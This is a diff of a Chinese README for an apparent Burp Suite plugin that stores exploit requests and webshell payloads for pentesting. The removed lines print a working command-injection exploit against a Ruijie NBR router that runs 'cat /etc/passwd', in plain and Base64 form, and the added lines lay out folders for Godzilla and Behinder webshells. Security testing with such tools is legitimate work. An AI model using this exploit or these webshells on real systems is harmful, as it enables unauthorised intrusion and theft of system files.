@@ -10,78 +10,53 @@
 
 ### 使用
 
-1、下载压缩包，修改DAM目录下的文件
+下载压缩包，修改DAM目录下的目录或文件
 
-2、**使用 vscode 来修改 exp.yaml ， payload.yaml 和 tools.yaml** （**yaml 语法**）
+- Exp 目录（不能修改目录名）是漏洞相关的，会**修改整个数据包**
 
-```
-DAM:
-|_exp.yaml
-|_payload.yaml
-|_tools.yaml
-```
+- Payload 目录（不能修改目录名），把 **Payload 插入到数据包中**
+
+- `{{Host}}`  或 `{{Hostname}}` 自动获取相关的 Host
+- `{{Cookie}}`  获取Cookie
 
 
 
-#### payload.yaml
-
-该文件是把 **Payload 插入到 数据包 中** （在文件上传的时候快速插入webshell，不用再生成或者翻文件来复制粘贴了）
+目录架构：可以在Exp或Payload目录下随意新建目录或文件。
 
 ```
-<?php phpinfo();?>
+├─Exp
+│  ├─OA漏洞
+│  │  ├─OA
+│  │  │   漏洞1.txt
+│  │  ├─OA2
+│  │  │   漏洞2.txt
+└─Payload
+    └─Webshell
+        ├─哥斯拉
+        │      jsp.txt
+        ├─冰蝎
+        │      jsp.txt
 ```
 
-需要把 payload  Base64 编码
+漏洞1：把漏洞的数据包保存为文件，修改相关的 Host ,Cookie。
+
+```http
+GET / HTTP/1.1
+Host: {{Host}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68
+Cookie: {{Cookie}}
+Connection: close
+
 
 ```
-PD9waHAgcGhwaW5mbygpOz8+
-```
-
-```
-WebShell:
-  蚁剑:
-    PHP:
-      PD9waHAgcGhwaW5mbygpOz8+
-```
-
-![2](./images/2.png)
 
 
 
-#### exp.yaml
 
-获取 host 和 Cookie **修改整个数据包**（如果 Repeater 没有 Target 就使用不了）
 
-host 和 cookie 的位置使用占位符 `%s`  ,  如果是未授权的就不需要 cookie。
+![](./images/1.png)
 
-```
-POST /guest_auth/guestIsUp.php HTTP/1.1 
-Host: %s
-Connection: close Upgrade-Insecure-Requests: 1 
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 
-Cookie: %s
-Content-Type: application/x-www-form-urlencoded 
-Content-Length: 56 
 
-mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
-```
-
-然后把 exp   **Base64编码**
-
-```
-UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
-```
-
-编写 exp.yaml（**yaml 语法**）
-
-```
-设备漏洞:
-  锐捷漏洞:
-    锐捷NBR路由器-前台RCE:
-      UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
-```
-
-![1](./images/1.png)
 
 #### tools.yaml
 
@@ -109,6 +84,12 @@ https://www.baidu.com/index.php
 
 
 
+![](./images/2.png)
+
+
+
+
+
 ### 更新日志
 
 #### 1.0.5
@@ -121,7 +102,7 @@ https://www.baidu.com/index.php
 
 新增随机生成信息：https://github.com/smxiazi/xia_Liao
 
-![](./images/7.png)
+
 
 #### 1.0.3.1
 
@@ -140,50 +121,11 @@ https://github.com/bit4woo/knife
 
 https://github.com/kN6jq/gather
 
-![3](./images/5.png)
 
-添加保存完成之后在菜单右键可以看到工具
-
-![3](./images/6.png)
 
 #### 1.0.2
 
 1.0.2 版本添加了一个 GUI 方便查看 漏洞 和 Payload
-
-![3](./images/3.png)
-
-
-
-
-### 已知BUG
-
-第三层不能同名，这样通过 JSP 获取内容就会出错，只会获取到最后一个 冰蝎3 的 JSP
-
-```yaml
-WebShell:
-  哥斯拉:
-    JSP:
-      dGVzdA==
-  冰蝎3:
-    JSP:
-      MTIz
-```
-
-建议修改为
-
-```yaml
-WebShell:
-  哥斯拉:
-    哥斯拉-JSP:
-      dGVzdA==
-  冰蝎3:
-    冰蝎3-JSP:
-      MTIz
-```
-
-这样就可以获取到相对的内容。
-
-
 
 
 
